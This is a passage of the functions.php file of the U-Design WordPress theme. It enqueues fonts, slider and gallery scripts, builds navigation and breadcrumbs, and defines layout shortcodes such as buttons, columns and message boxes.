<?php 
/**
 * @package WordPress
 * @subpackage U-Design
 */


// Create Text Domain For the Themes' Translations
if (function_exists('load_theme_textdomain')) {
    load_theme_textdomain('udesign', get_template_directory().'/locale');
}

// load styles
function my_init_styles() {
    if( !is_admin() ){
	// get the desired color scheme
	global $udesign_options, $style;
	// Format the Google WebFonts as string
	if( $udesign_options['google_web_fonts_assoc'] ) {
	    $google_fonts_string = implode( '|', array_unique($udesign_options['google_web_fonts_assoc']) );
	    if( $google_fonts_string )
		    printf("<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=%s' type='text/css' />\r\n", str_replace(' ', '+', $google_fonts_string));
	}
	wp_enqueue_style('reset', get_bloginfo('template_url') . '/styles/common-css/reset.css', false, '1.0', 'screen');
	wp_enqueue_style('text', get_bloginfo('template_url') . "/styles/{$style}/css/text.css", false, '1.0', 'screen');
	wp_enqueue_style('grid-960', get_bloginfo('template_url') . '/styles/common-css/960.css', false, '1.0', 'screen');
	wp_enqueue_style('superfish_menu', get_bloginfo('template_url') . '/scripts/superfish-1.4.8/css/superfish.css', false, '1.0', 'screen');
        if ( $udesign_options['enable_prettyPhoto_script'] &&  !WP_PRETTY_PHOTO_PLUGIN_ACTIVE ) {
            wp_enqueue_style('pretty_photo', get_bloginfo('template_url') . '/scripts/prettyPhoto/css/prettyPhoto.css', false, '3.1.3', 'screen');
        }
	wp_enqueue_style('style', get_bloginfo('template_url') . "/styles/{$style}/css/style.css", false, '1.0', 'screen');
	wp_enqueue_style('custom-style', get_bloginfo('template_url') . '/styles/custom/custom_style.php', false, '', 'screen');
        if ( $udesign_options['enable_default_style_css'] ) {
            wp_enqueue_style('style-orig', get_stylesheet_directory_uri() . "/style.css", false, '1.0', 'screen');
        }
    }
}
add_action('wp_print_styles', 'my_init_styles');

// load scripts
function my_init_scripts() {
	wp_undesign_option();

    if( !is_admin() ){
	global $udesign_options, $current_slider;
        
        // Load jQuery
	if( WP_PRETTY_PHOTO_PLUGIN_ACTIVE ) { // WP-prettyPhoto requires jquery 1.4.2
            wp_deregister_script( 'jquery' );
            wp_register_script( 'jquery', get_bloginfo('template_url')."/scripts/jquery-1.4.2.min.js", false, '' );
        }
	wp_enqueue_script('jquery');

	// Cufon
	if( $udesign_options['enable_cufon'] ) {
	    wp_enqueue_script('cufon_lib', get_bloginfo('template_url')."/scripts/cufon/cufon-yui.js", array('jquery'), '1.09i', false);

	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Aubrey' )
		    wp_enqueue_script('font_aubrey', get_bloginfo('template_url')."/scripts/cufon/Aubrey/Aubrey_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Bebas' )
		    wp_enqueue_script('font_bebas', get_bloginfo('template_url')."/scripts/cufon/Bebas/Bebas_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Blue Highway' )
		    wp_enqueue_script('font_blue_highway', get_bloginfo('template_url')."/scripts/cufon/Blue_Highway/Blue_Highway_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Blue Highway D Type' )
		    wp_enqueue_script('font_blue_highway_d_type', get_bloginfo('template_url')."/scripts/cufon/Blue_Highway/Blue_Highway_D_Type_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Diavlo Book' )
		    wp_enqueue_script('font_diavlo_book', get_bloginfo('template_url')."/scripts/cufon/Diavlo/Diavlo_Book_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'eurofurence' )
		    wp_enqueue_script('font_eurofurence', get_bloginfo('template_url')."/scripts/cufon/Eurofurence/eurofurence_500.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'GeosansLight' )
		    wp_enqueue_script('font_geosanslight', get_bloginfo('template_url')."/scripts/cufon/GeosansLight/GeosansLight_500.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Oregon LDO' )
		    wp_enqueue_script('font_oregon_ldo', get_bloginfo('template_url')."/scripts/cufon/Oregon_LDO/Oregon_LDO_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Qlassik Medium' )
		    wp_enqueue_script('font_qlassik_medium', get_bloginfo('template_url')."/scripts/cufon/Qlassik/Qlassik_Medium_500.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Sansation' )
		    wp_enqueue_script('font_sansation', get_bloginfo('template_url')."/scripts/cufon/Sansation/Sansation_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Sniglet' )
		    wp_enqueue_script('font_sniglet', get_bloginfo('template_url')."/scripts/cufon/Sniglet/Sniglet_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Tertre Med' )
		    wp_enqueue_script('font_tertre_med', get_bloginfo('template_url')."/scripts/cufon/Tertre/Tertre_Med_800.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Waukegan LDO' )
		    wp_enqueue_script('font_waukegan_ldo', get_bloginfo('template_url')."/scripts/cufon/Waukegan_LDO/Waukegan_LDO_400.font.js", array('cufon_lib'), '1.0', false);
	    if ( $udesign_options['cufon_fonts_assoc']['title_headings_font_family'] == 'Yorkville' )
		    wp_enqueue_script('font_yorkville', get_bloginfo('template_url')."/scripts/cufon/Yorkville/yorkville_400.font.js", array('cufon_lib'), '1.0', false);
	}

	// swfobject scripts
	if( is_front_page() && $current_slider == '1' ) {
	    wp_enqueue_script('flashmo-swfobject', get_bloginfo('template_url')."/sliders/flashmo/grid_slider/swfobject.js", '', '2.2', false);
	}
	if( is_front_page() && ( $current_slider == '2' || $current_slider == '3' ) ) {
	    wp_enqueue_script('piecemaker-swfobject', get_bloginfo('template_url')."/sliders/piecemaker/js/swfobject.js", '', '1.5', false);
	}
	
	// Cycle 1 Slider Plugin
	if( is_front_page() && $current_slider == '4' ) {
	    wp_enqueue_script('cycle', get_bloginfo('template_url')."/sliders/cycle/jquery.cycle.all.min.js", array('jquery'), '2.86', false);
	    wp_enqueue_script('cycle1', get_bloginfo('template_url')."/sliders/cycle/cycle1/cycle1_script.js", array('jquery'), '1.0.0', false);
	}

	// Cycle 2 Slider Plugin
	if( is_front_page() && $current_slider == '5' ) {
	    wp_enqueue_script('cycle', get_bloginfo('template_url')."/sliders/cycle/jquery.cycle.all.min.js", array('jquery'), '2.86', false);
	    wp_enqueue_script('cycle2', get_bloginfo('template_url')."/sliders/cycle/cycle2/cycle2_script.js", array('jquery'), '1.0.0', false);
	}

	// Cycle 3 Slider Plugin
	if( is_front_page() && $current_slider == '6' ) {
	    wp_enqueue_script('cycle', get_bloginfo('template_url')."/sliders/cycle/jquery.cycle.all.min.js", array('jquery'), '2.99', false);
	    wp_enqueue_script('jquery-easing', get_bloginfo('template_url')."/sliders/cycle/jquery.easing.1.3.js", array('jquery'), '1.3', false);
	    wp_enqueue_script('cycle3', get_bloginfo('template_url')."/sliders/cycle/cycle3/cycle3_script.js", array('jquery'), '1.0.0', false);
	}

	// PrettyPhoto script
	if( $udesign_options['enable_prettyPhoto_script'] && !WP_PRETTY_PHOTO_PLUGIN_ACTIVE ) {
            wp_enqueue_script('pretty_photo_lib', get_bloginfo('template_url')."/scripts/prettyPhoto/js/jquery.prettyPhoto.js", array('jquery'), '3.1.3', false);
            wp_enqueue_script('custom_pretty_photo', get_bloginfo('template_url')."/scripts/prettyPhoto/custom_params.js", array('pretty_photo_lib'), '3.1.3', true);
        }
        
	// jQuery validation script
        if ( is_page_template('page-Contact.php') ) {
            wp_enqueue_script('jquery_validate_lib', get_bloginfo('template_url')."/scripts/jquery-validate/jquery.validate.min.js", array('jquery'), '1.8.1', false);
            wp_enqueue_script('masked_input_plugin', get_bloginfo('template_url')."/scripts/masked-input-plugin/jquery.maskedinput.min.js", array('jquery'), '1.3', false);
        }

	// Superfish Dropdown menu scripts (combined)
	wp_enqueue_script('superfish-menu', get_bloginfo('template_url')."/scripts/superfish-1.4.8/js/superfish.combined.js", array('jquery'), '1.0.0', false);
        
	// Miscellaneous JS scripts
	wp_enqueue_script('scripts', get_bloginfo('template_url')."/scripts/script.js", array('jquery'), '1.0', false);
    }
}
add_action('wp_print_scripts', 'my_init_scripts');

// Define a global variable '$portfolio_pages_array' as an array containing all pages assigned to be Portfolio pages
global $portfolio_pages_array;
$portfolio_1_pages_array = get_pages('meta_key=_wp_page_template&meta_value=page-Portfolio1Col.php&hierarchical=0');
$portfolio_2_pages_array = get_pages('meta_key=_wp_page_template&meta_value=page-Portfolio2Col.php&hierarchical=0');
$portfolio_3_pages_array = get_pages('meta_key=_wp_page_template&meta_value=page-Portfolio3Col.php&hierarchical=0');
$portfolio_4_pages_array = get_pages('meta_key=_wp_page_template&meta_value=page-Portfolio4Col.php&hierarchical=0');
$portfolio_pages_array = array_merge($portfolio_1_pages_array, $portfolio_2_pages_array, $portfolio_3_pages_array, $portfolio_4_pages_array);


// Menu functions with support for WordPress 3.0 menus
if ( function_exists('wp_nav_menu') ) {
    add_theme_support( 'nav-menus' );
    register_nav_menus( array(
	'primary' => esc_html__( 'Primary Navigation', 'udesign' ),
    ) );
}

function udesign_nav() {
    if ( function_exists( 'wp_nav_menu' ) )
	wp_nav_menu( array( 'container_class' => 'navigation-menu',
			    'container_id' => 'navigation-menu',
			    'menu_class' => 'sf-menu',
			    'link_before'=> '<span>',
			    'link_after' => '</span>',
			    'theme_location' => 'primary',
			    'fallback_cb' => 'udesign_nav_fallback' )
			);
    else
        udesign_nav_fallback();
}

function udesign_nav_fallback() {
    global $udesign_options;
    $menu_html = '<div id="navigation-menu" class="navigation-menu">';
    $menu_html .= '<ul class="sf-menu">';
    $menu_html .= is_front_page() ? "<li class='current_page_item'>" : "<li>";
    $menu_html .= '<a href="'.get_bloginfo('url').'"><span>'.esc_html__('Home', 'udesign').'</span></a></li>';
    $menu_html .= wp_list_pages('depth=5&title_li=0&sort_column=menu_order&link_before=<span>&link_after=</span>&exclude='.$udesign_options['excluded_paged_from_menu'].'&echo=0');
    $menu_html .= '</ul>';
    $menu_html .= '</div>';
    echo $menu_html;
}


if ( function_exists('add_theme_support') ) {
    add_theme_support( 'automatic-feed-links' );
} elseif ( function_exists('automatic_feed_links') ) {
    automatic_feed_links();
}

// replace the original get_search_form() with the internationalized version here:
function translatable_search_form( $form ) {
    $form = '<form role="search" method="get" id="searchform" action="'.get_bloginfo('url').'" >
    <div><label class="screen-reader-text" for="s">' . __('Search for:', 'udesign') . '</label>
	<input type="text" value="' . get_search_query() . '" name="s" id="s" />
	<input type="submit" id="searchsubmit" value="'. esc_attr__('Search', 'udesign') .'" />
    </div>
    </form>';
    return $form;
}
add_filter( 'get_search_form', 'translatable_search_form' );


/* Check for image */
function findImage() {
	$content = get_the_content();
	$count = substr_count($content, '<img');
	if ($count > 0) return true;
	else return false;
}

/* Get the first image from the post and return it */
function get_image_url() {
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $first_img = $matches [1] [0];

    if(empty($first_img)){ //Defines a default image
	$first_img = "/images/thumbnail-default.jpg";
    }
    return $first_img;
}


/**
 * Tests if any of a post's assigned categories are descendants of target categories
 *
 * @param int|array $cats The target categories. Integer ID or array of integer IDs
 * @param int|object $_post The post. Omit to test the current post in the Loop or main query
 * @return bool True if at least 1 of the post's categories is a descendant of any of the target categories
 * @see get_term_by() You can get a category by name or slug, then pass ID to this function
 * @uses get_term_children() Passes $cats
 * @uses in_category() Passes $_post (can be empty)
 * @version 2.7+
 * @link http://codex.wordpress.org/Function_Reference/in_category#Testing_if_a_post_is_in_a_descendant_category
 */
function test_post_is_in_descendant_category( $cats, $_post = null )
{
    foreach ( (array) $cats as $cat ) {
	// get_term_children() accepts integer ID only
	$descendants = get_term_children( (int) $cat, 'category');
	if ( $descendants && in_category( $descendants, $_post ) )
	return true;
    }
    return false;
}

/**
 * Tests if any of a post's assigned categories are in the target categories or in any of the descendants
 *
 * @param int|array $cats The target categories. Integer ID or array of integer IDs
 * @param int|object $_post The post. Omit to test the current post in the Loop or main query
 * @return bool True if at least 1 of the post's categories is a descendant of any of the target categories
 * @see get_term_by() You can get a category by name or slug, then pass ID to this function
 * @uses get_term_children() Passes $cats
 * @uses in_category() Passes $_post (can be empty)
 * @version 2.7+
 */
function post_is_in_category_or_descendants( $cats, $_post = null )
{
    if( in_category( $cats, $_post = null ) || test_post_is_in_descendant_category( $cats, $_post = null ) ) {
	return true;
    }
    return false;
}

/**
 * This function is used to generate custom breadcrumbs for single posts view. Portfolio section or regular Blog is considered
 * when generating the link structure.
 */
function get_category_parents_for_breadcrumbs( $id, $link = false, $separator = '/' ) {
	global $udesign_options, $portfolio_pages_array;
	$portfolio_cats_array = explode( ',', $udesign_options['portfolio_categories'] );
	if ( post_is_in_category_or_descendants($portfolio_cats_array) ) { // if the current post belongs to any Porfolio category
	    foreach ( $portfolio_pages_array as $portfolio_page_obj ) {
		$port_page_ID = $portfolio_page_obj->ID;
		if ( post_is_in_category_or_descendants( $udesign_options['portfolio_cat_for_page_'.$port_page_ID] ) ) {
		    echo get_category_parents_for_portfolio_page( $id, $link, $separator, FALSE , $port_page_ID );
		    break;
		}
	    }
	} else { // if the current category is a regular blog category
	    echo get_category_parents( $id, $link, $separator, FALSE );
	}
}
/**
 * This is the modified version of the "get_category_parents()" WP function
 * Retrieve category parents with separator for use in the Portfolio section to generate proper breadcrumb links.
 * The new parameter added is $portfolio_page_id which is the id of the page assigned with the Porfolio page template.
 * @since 1.2.0
 * @param int $id Category ID.
 * @param bool $link Optional, default is false. Whether to format with link.
 * @param string $separator Optional, default is '/'. How to separate categories.
 * @param bool $nicename Optional, default is false. Whether to use nice name for display.
 * @param string $portfolio_page_id Optional. Already linked to categories to prevent duplicates.
 * @param array $visited Optional. Already linked to categories to prevent duplicates.
 * @return string
 */
function get_category_parents_for_portfolio_page( $id, $link = false, $separator = '/', $nicename = false, $portfolio_page_id='', $visited = array() ) {
	global $udesign_options;
	$chain = '';
	$parent = &get_category( $id );
	if ( is_wp_error( $parent ) ) return $parent;
	$name = ( $nicename ) ? $parent->slug : $parent->cat_name;
	if ( $parent->parent && ( $parent->parent != $parent->term_id ) && !in_array( $parent->parent, $visited ) ) {
		$visited[] = $parent->parent;
		$chain .= '<a href="'.get_permalink( $portfolio_page_id ).'" title="'.esc_attr( sprintf( __( "Go back to %s", 'udesign' ), get_the_title($portfolio_page_id) ) ).'">'.get_the_title($portfolio_page_id).'</a>' . $separator . ' ';
	}
	if ( $link ) { // generate comma separated list of categories' links that the current single post has been assigned to
		$query_string_prefix = ( get_option('permalink_structure') != '' ) ? '?' : '&amp;';
		$categories_names_array = array();
		foreach((get_the_category()) as $category) {
		    if ( ( cat_is_ancestor_of( $udesign_options['portfolio_cat_for_page_'.$portfolio_page_id], $category->term_id ) ||
					       $udesign_options['portfolio_cat_for_page_'.$portfolio_page_id] == $category->term_id ) ) { // belongs to a category associated with the current portfolio page
			if ( preg_match( '/\?/', get_permalink($portfolio_page_id) ) ) $query_string_prefix = '&amp;';
                        $curr_cat_link = '<a href="'.get_permalink($portfolio_page_id).$query_string_prefix.'cat=' . ( $category->term_id ) . '" title="' . esc_attr( sprintf( __( "Go back to %s", 'udesign' ), $category->cat_name ) ) . '">'.$category->cat_name.'</a>';
			array_push( $categories_names_array, $curr_cat_link );
		    }
		}
		$chain .= implode( ", ", $categories_names_array ) . $separator;
	} else { // generate comma separated list of categories' names that the current single post has been assigned to
		$categories_names_array = array();
		foreach((get_the_category()) as $category) {
		    if ( ( cat_is_ancestor_of( $udesign_options['portfolio_cat_for_page_'.$portfolio_page_id], $category->term_id ) ||
					       $udesign_options['portfolio_cat_for_page_'.$portfolio_page_id] == $category->term_id ) ) { // belongs to a category associated with the current portfolio page
			array_push( $categories_names_array, $category->cat_name );
		    }
		}
		$chain .= implode( ", ", $categories_names_array ) . $separator;
	}
	return $chain;
}

/**
 * Check the validity of the given Phone Numbers (North American)
 * This regex will validate a 10-digit North American telephone number.
 * Separators are not required, but can include spaces, hyphens, or periods.
 * Parentheses around the area code are also optional.
 *
 * @param string $phone The phone number
 * @return bool true if the phone number is valid or false otherwise
 */
function isPhoneNumberValid( $phone ) {
    // validate a phone number
    $pattern = '/^((([0-9]{1})*[- .(]*([0-9]{3})[- .)]*[0-9]{3}[- .]*[0-9]{4})+)*$/';
    return preg_match( $pattern, $phone );
}


// Custom Comment template
function mytheme_comment( $comment, $args, $depth ) {
   $GLOBALS['comment'] = $comment;
   $template_dir_url = get_bloginfo('template_url'); ?>

   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
	<div class="comment-meta vcard pngfix">
	    <div class="avatar-wrapper">
<?php		echo get_avatar( $comment, $size='52', $default="{$template_dir_url}/styles/common-images/mystery-man.jpg" ); ?>
	    </div>
	    <div class="commentmetadata">
		<div class="author"><?php comment_author_link() ?></div>
<?php		    printf(__('<span class="time">%1$s</span> on <a href="#comment-%2$s" title="">%3$s</a>', 'udesign'), get_comment_time(__('g:i a', 'udesign')), get_comment_ID(), get_comment_date(__('F j, Y', 'udesign')) );
		    edit_comment_link(esc_html__('edit', 'udesign'),'&nbsp;&nbsp;',''); ?>
	    </div>
	</div>

	<div class="commenttext">
<?php	    if ($comment->comment_approved == '0') : ?>
		<em><?php esc_html_e('Your comment is awaiting moderation.', 'udesign') ?></em>
		<br />
<?php	    endif; ?>
<?php	    comment_text() ?>
	    <div class="reply">
<?php		comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	    </div>
	</div>


     </div>
<?php
}

// Include the posts' count under a category into the a-tag when listing the categories
function posts_count_inside_the_link( $html ) {
    $html = preg_replace( '/\<\/a\> \((.*)\)/', ' <span class="posts-counter">($1)</span></a>', $html );
    return $html;
}
add_filter('wp_list_categories', 'posts_count_inside_the_link');

// Include the posts' count under an archive into the a-tag when listing the categories
function posts_count_inside_archive_link( $html ) {
    $html = preg_replace( '/\<\/a\>&nbsp;\((.*)\)/', ' <span class="posts-counter">($1)</span></a>', $html );
    return $html;
}
add_filter('get_archives_link', 'posts_count_inside_archive_link');
 
/***************** BEGIN EXCERPTS ******************/
// change the length of excerpts
function new_excerpt_length( $length ) {
    global $udesign_options;
    return $udesign_options['excerpt_length_in_words'];
}
add_filter('excerpt_length', 'new_excerpt_length');

// remove the '[...]'
function moreLink( $content ){
    return str_replace( '[...]', '', do_shortcode($content) );
}
add_filter('the_excerpt', 'moreLink');

// Custom length of the excerpt in words
function custom_string_length_by_words( $string, $limit ) {
    $array_of_words = explode(' ', $string, ($limit + 1));
    if( count($array_of_words) > $limit ){
	array_pop($array_of_words);
    }
    return implode(' ', $array_of_words);
}
/***************** END EXCERPTS ******************/


/***************** BEGIN SHORTCODES ******************/
// Allows shortcodes to be displayed in sidebar widgets
add_filter('widget_text', 'do_shortcode');

// Shirtcode: "Read More ->" Link.
// Usage: [read_more text="Read more" title="Read More..." url="http://www.some-url-goes-here.com/" align="left" target="_blank"]
function read_more_func( $atts ) {
    extract(shortcode_atts(array(
	    'text' => esc_html__('Read more', 'udesign'),
	    'title' => '',
	    'url' => '#',
	    'align' => 'left',
	    'target' => '',
    ), $atts));

    $target = ($target == '_blank') ? ' target="_blank"' : '';
    $align_class = ( $align == 'right' ) ? '-align-right': '-align-left';
    $html = '<a class="read-more'.$align_class.'" href="'.$url.'" title="'.$title.'"'.$target.'><span>'.do_shortcode($text).'</span> &rarr;</a>';
    return $html;
}
add_shortcode('read_more', 'read_more_func');

// Shirtcode: Button.
// Usage: [button text="Read more..." style="light" title="Nice Button" url="http://www.some-url-goes-here.com/" align="left" target="_blank"]
function button_func( $atts ) {
    extract(shortcode_atts(array(
	    'text' => esc_html__('Read more...', 'udesign'),
	    'style' => 'dark',
	    'title' => '',
	    'url' => '#',
	    'align' => 'left',
	    'target' => '',
    ), $atts));

    $target = ($target == '_blank') ? ' target="_blank"' : '';
    $align_class = ( $align == 'right' ) ? ' align-btn-right': ' align-btn-left';
    $style_class = ( $style == 'dark' ) ? ' dark-button': ' light-button';
    $html = '<div class="clear"></div>
		<a class="pngfix'.$style_class.$align_class.'" href="'.$url.'" title="'.$title.'"'.$target.'><span class="pngfix">'.do_shortcode($text).'</span></a>
	     <div class="clear"></div>';
    return $html;
}
add_shortcode('button', 'button_func');

// Shirtcode: Small Button.
// Usage: [small_button text="Read more..." style="light" title="Nice Button" url="http://www.some-url-goes-here.com/" align="left" target="_blank"]
function small_button_func( $atts ) {
    extract(shortcode_atts(array(
	    'text' => esc_html__('Read more...', 'udesign'),
	    'style' => 'dark',
	    'title' => '',
	    'url' => '#',
	    'align' => 'left',
	    'target' => '',
    ), $atts));

    $target = ($target == '_blank') ? ' target="_blank"' : '';
    $align_class = ( $align == 'right' ) ? ' align-btn-right': ' align-btn-left';
    $style_class = ( $style == 'dark' ) ? ' small-dark-button': ' small-light-button';
    $html = '<div class="clear"></div>
		<a class="pngfix'.$style_class.$align_class.'" href="'.$url.'" title="'.$title.'"'.$target.'><span class="pngfix">'.do_shortcode($text).'</span></a>
	     <div class="clear"></div>';
    return $html;
}
add_shortcode('small_button', 'small_button_func');

// Shirtcode: Round Button.
// Usage: [round_button text="Read more..." style="light" title="Nice Button" url="http://www.some-url-goes-here.com/" align="left" target="_blank"]
function round_button_func( $atts ) {
    extract(shortcode_atts(array(
	    'text' => esc_html__('Read more...', 'udesign'),
	    'style' => 'dark',
	    'title' => '',
	    'url' => '#',
	    'align' => 'left',
	    'target' => '',
    ), $atts));
    $target = ($target == '_blank') ? ' target="_blank"' : '';
    $align_class = ( $align == 'right' ) ? ' align-btn-right': ' align-btn-left';
    $style_class = ( $style == 'dark' ) ? ' dark-round-button': ' light-round-button';
    $html = '<div class="clear"></div>
		<a class="pngfix'.$style_class.$align_class.'" href="'.$url.'" title="'.$title.'"'.$target.'><span class="pngfix">'.do_shortcode($text).'</span></a>
	     <div class="clear"></div>';
    return $html;
}
add_shortcode('round_button', 'round_button_func');

// Shirtcode: Custom Button.
// Usage: [custom_button text="Read more..." title="Nice Button" url="http://www.some-url-goes-here.com/" size="medium" bg_color="#FF5C00" text_color="#FFFFFF" align="left" target="_blank"]
// Options: align: left or right, size: small, medium, large and x-large, the rest are self explanatory...
function custom_button_func( $atts ) {
    extract(shortcode_atts(array(
	    'text' => esc_html__('Read more...', 'udesign'),
	    'title' => '',
	    'url' => '#',
	    'size' => 'medium',
	    'bg_color' => '#FF5C00',
	    'text_color' => '#FFFFFF',
	    'align' => 'left',
	    'target' => '',
    ), $atts));
    $target = ($target == '_blank') ? ' target="_blank"' : '';
    $align_class = ( $align == 'right' ) ? ' align-btn-right': ' align-btn-left';
    $html = '
                <a class="'.strtolower($size).' custom-button'.$align_class.'" href="'.$url.'" title="'.$title.'"'.$target.'><span style="background-color:'.$bg_color.'; color:'.$text_color.'">'.do_shortcode($text).'</span></a>
	     ';
    return $html;
}
add_shortcode('custom_button', 'custom_button_func');

// Shirtcode: Divider with an anchor link to top of page.
// Usage: [divider]
function divider_func( $atts ) {
    return '<div class="divider"></div>';
}
add_shortcode('divider', 'divider_func');

// Shirtcode: Divider with an anchor link to top of page.
// Usage: [divider_top]
function divider_top_func( $atts ) {
    return '<div class="divider top-of-page"><a href="#top" title="'.esc_html__('Top of Page', 'udesign').'">'.esc_html__('Back to Top', 'udesign').'</a></div>';
}
add_shortcode('divider_top', 'divider_top_func');

// Shirtcode: Clear , used to clear an element of its neighbors, no floating elements are allowed on the left or the right side.
// Usage: [clear]
function clear_func( $atts ) {
    return '<div class="clear"></div>';
}
add_shortcode('clear', 'clear_func');

// Shirtcode: Mesage Box. Predefined and custom.
// Usage (pre-defined): [message type="info"]Your info message goes here...[/message]
// there are 4 pre-set message types: "info", "success", "warning", "erroneous"
// Usage (custom): [message type="custom" width="100%" start_color="#FFFFFF" end_color="#EEEEEE" border="#BBBBBB" color="#333333"]Your info message goes here...[/message]
// width could be in pixels as well, e.g. width="250px"
// Usage (simple): [message type="simple" bg_color="#EEEEEE" color="#333333"]Your info message goes here...[/message]
function message_box_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'type' => 'custom',
	    'align' => 'left',
	    'start_color' => '#FFFFFF',
	    'end_color' => '#EEEEEE',
	    'border' => '#BBBBBB',
	    'width' => '100%',
	    'color' => '#333333',
	    'bg_color' => '#F5F5F5',
    ), $atts));
    if ($type == 'custom') {
	if ($align == 'center') {
	    $margin_left = $margin_right = 'auto !important';
	} elseif ($align == 'right') {
	    $margin_left = 'auto !important';
	    $margin_right = '0 !important';
	} else { // default: LEFT
	    $margin_left = $margin_right = '0 !important';
	}
	$html = '<div class="'.$type.'" style="background:-moz-linear-gradient(center top , '.$start_color.', '.$end_color.') repeat scroll 0 0 transparent;
					       background: -webkit-gradient(linear, center top, center bottom, from('.$start_color.'), to('.$end_color.'));
					       margin-left:'.$margin_left.';
					       margin-right:'.$margin_right.';
					       border:1px solid '.$border.';
					       background-color: '.$end_color.';
					       width:'.$width.';
					       color:'.$color.';"><div class="inner-padding">'.do_shortcode($content).'</div></div>';
    } elseif ($type == 'simple') {
	$html = '<div class="'.$type.'" style="background-color:'.$bg_color.'; color:'.$color.';"><div class="inner-padding">'.do_shortcode($content).'</div></div>';
    } else {
	$html = '<div class="'.$type.'"><div class="msg-box-icon pngfix">'.do_shortcode($content).'</div></div>';
    }
    return $html;
}
add_shortcode('message', 'message_box_func');

// Shirtcode: PullQuote.
// Usage: [pullquote style="left" quote="light"], style options: 'left', 'right'; quote options: 'light' (optional), otherwise defaults to dark style
function pullquote_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'style' => 'left',
	    'quote' => 'dark',
    ), $atts));
    $align = ($style == 'right') ? 'alignright' : 'alignleft';
    $quote_color = ($quote == 'light') ? ' bq-light' : '';
    return '<blockquote class="'.$align.$quote_color.'">'.do_shortcode($content).'</blockquote>';
}
add_shortcode('pullquote', 'pullquote_func');

// Shortcode: Dropcap
// Usage: [dropcap]A[/dropcap]
function dropcap_func( $atts, $content = null ) {
    return '<span class="dropcap">'.$content.'</span>';
}
add_shortcode('dropcap', 'dropcap_func');

// Shortcode: one_fourth
// Usage: [one_fourth]Content goes here...[/one_fourth]
function one_fourth_func( $atts, $content = null ) {
    return '<div class="one_fourth">'.do_shortcode($content).'</div>';
}
add_shortcode('one_fourth', 'one_fourth_func');

// Shortcode: one_fourth_last
// Usage: [one_fourth_last]Content goes here...[/one_fourth_last]
function one_fourth_last_func( $atts, $content = null ) {
    return '<div class="one_fourth last_column">'.do_shortcode($content).'</div>';
}
add_shortcode('one_fourth_last', 'one_fourth_last_func');

// Shortcode: one_third
// Usage: [one_third]Content goes here...[/one_third]
function one_third_func( $atts, $content = null ) {
    return '<div class="one_third">'.do_shortcode($content).'</div>';
}
add_shortcode('one_third', 'one_third_func');

// Shortcode: one_third_last
// Usage: [one_third_last]Content goes here...[/one_third_last]
function one_third_last_func( $atts, $content = null ) {
    return '<div class="one_third last_column">'.do_shortcode($content).'</div>';
}
add_shortcode('one_third_last', 'one_third_last_func');

// Shortcode: one_half
// Usage: [one_half]Content goes here...[/one_half]
function one_half_func( $atts, $content = null ) {
    return '<div class="one_half">'.do_shortcode($content).'</div>';
}
add_shortcode('one_half', 'one_half_func');

// Shortcode: one_half_last
// Usage: [one_half_last]Content goes here...[/one_half_last]
function one_half_last_func( $atts, $content = null ) {
    return '<div class="one_half last_column">'.do_shortcode($content).'</div>';
}
add_shortcode('one_half_last', 'one_half_last_func');

// Shortcode: two_third
// Usage: [two_third]Content goes here...[/two_third]
function two_third_func( $atts, $content = null ) {
    return '<div class="two_third">'.do_shortcode($content).'</div>';
}
add_shortcode('two_third', 'two_third_func');

// Shortcode: two_third_last
// Usage: [two_third_last]Content goes here...[/two_third_last]
function two_third_last_func( $atts, $content = null ) {
    return '<div class="two_third last_column">'.do_shortcode($content).'</div>';
}
add_shortcode('two_third_last', 'two_third_last_func');

// Shortcode: three_fourth
// Usage: [three_fourth]Content goes here...[/three_fourth]
function three_fourth_func( $atts, $content = null ) {
    return '<div class="three_fourth">'.do_shortcode($content).'</div>';
}
add_shortcode('three_fourth', 'three_fourth_func');

// Shortcode: three_fourth_last
// Usage: [three_fourth_last]Content goes here...[/three_fourth_last]
function three_fourth_last_func( $atts, $content = null ) {
    return '<div class="three_fourth last_column">'.do_shortcode($content).'</div>';
}
add_shortcode('three_fourth_last', 'three_fourth_last_func');

// Shortcode: toggle_content
// Usage: [toggle_content title="Title"]Your content goes here...[/toggle_content]
function toggle_content_func( $atts, $content = null ) {
    extract(shortcode_atts(array(
	    'title'      => '',
    ), $atts));
    $html = '<h4 class="slide_toggle"><a href="#">' .$title. '</a></h4>';
    $html .= '<div class="slide_toggle_content" style="display: none;">'.do_shortcode($content).'</div>';
    return $html;
}
add_shortcode('toggle_content', 'toggle_content_func');

// Shortcode: tab
// Usage: [tab title="title 1"]Your content goes here...[/tab]
function tab_func( $atts, $content = null ) {
